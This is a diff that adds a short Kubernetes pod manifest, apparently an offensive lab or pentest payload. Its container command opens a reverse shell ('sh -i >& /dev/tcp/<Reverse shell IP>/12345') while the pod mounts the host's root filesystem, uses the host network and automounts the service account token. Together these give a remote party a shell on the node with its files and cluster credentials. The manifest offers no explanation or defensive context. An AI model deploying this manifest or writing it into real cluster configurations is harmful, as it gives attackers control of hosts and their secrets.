@@ -1,0 +1,18 @@
+apiVersion: v1
+kind: pod
+metadata:
+  name: alpine
+spec:
+  containers:
+  - name: alpine
+    image: ubuntu
+    command: ['/bin/bash', '-c', 'sh -i >& /dev/tcp/<Reverse shell IP>/12345 0>&1']
+    volumeMounts:
+    - mountPath: /demo/
+      name: mount-demo-into-mnt
+  volumes:
+  - name: mount-demo-into-mnt
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
